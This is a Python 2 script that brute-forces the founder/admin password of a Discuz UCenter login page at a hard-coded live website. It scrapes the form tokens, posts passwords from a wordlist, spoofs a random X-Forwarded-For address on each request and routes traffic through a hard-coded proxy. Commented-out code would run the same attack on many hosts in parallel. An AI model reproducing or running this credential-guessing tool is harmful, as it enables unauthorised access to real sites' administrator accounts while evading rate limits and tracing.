# encoding:utf-8

from gevent import monkey
monkey.patch_all()
from gevent.pool import Pool

import os
from selenium import webdriver
import requests
import re
import random
import httplib
import sys


def exploit(host=''):

    # host  = 'http://companyformation-hk.com/'
    host = 'http://www.cncentos.com/'
    host = host.strip()
    url = host + 'uc_server/admin.php?m=user&a=login'
    # url = host + '/uc_server/admin.php?m=user&a=login'
    try:
        # response = requests.get(url, timeout=5)
        response = requests.get(url, timeout=5)
    except Exception, e:
        # print 'error:', url
        return
        # raw_input('please wait....')

    content = response.content
    formhash, seccondehidden = get_formhash_seccondehidden(content)
    if not formhash or not seccondehidden:
        return
    # print formhash
    # print seccondehidden

    # passwd = 'admin'
    i = 0
    for passwd in open('words1.txt', 'r'):

        i += 1
        if i < 7000:
            continue

        passwd = passwd.strip()
        ip = str(random.randint(1, 244)) + '.' + str(random.randint(1, 244)) + '.' + str(random.randint(1,244)) + '.' + str(random.randint(1, 244))
        headers={"User-Agent": "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:33.0) Gecko/20100101 Firefox/33.0","X-Forwarded-For":ip,'Content-Type':'application/x-www-form-urlencoded','Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8','Connection':'keep-alive'}
        post_data='sid=&formhash='+formhash+'&seccodehidden='+seccondehidden+'&iframe=0&isfounder=1&password='+passwd+'&seccode=cccc&submit=%E7%99%BB+%E5%BD%95'
        proxies = {
                # 'http':'139.196.108.68:80'
                # 'http':'115.28.173.134:8888'
                # 'http':'205.139.16.197:80'
                'http':'117.177.243.14:8081'
                }

        response = requests.post(url, headers=headers, data=post_data, proxies=proxies)
        content = response.content

        # print content
        if check_success(content):
            print i, passwd, '----> success'
            sys.exit()
        else:
            print i, passwd, '-----> fail'



def check_success(content):

    pattern_success = re.compile(ur'usernamediv')
    find_sign = pattern_success.findall(content)

    if find_sign:
            return False
    else:
        return True


def get_formhash_seccondehidden(content):

    formhash = ''
    seccondehidden = ''

    pattern = re.compile(r'name="formhash" value="(\w+)"')
    formhash_result = pattern.search(content)
    if formhash_result:
        formhash = formhash_result.groups()[0]

    pattern = re.compile(r'name="seccodehidden" value="(\S+)"')
    seccondehidden_result = pattern.search(content)
    if seccondehidden_result:
        seccondehidden = seccondehidden_result.groups()[0]

    return formhash, seccondehidden

def single_url_exploit():
    exploit()

def main():

    single_url_exploit()

    # for host in open('discuz.txt', 'r'):
        # exploit(host)
    # pools = Pool(20)
    # pools.map(exploit, open('discuz.txt', 'r'))
    # exploitpasswd = ExploitPasswd()
    # exploitpasswd.exploit()


if __name__ == '__main__':

    os.system('clear')

    main()
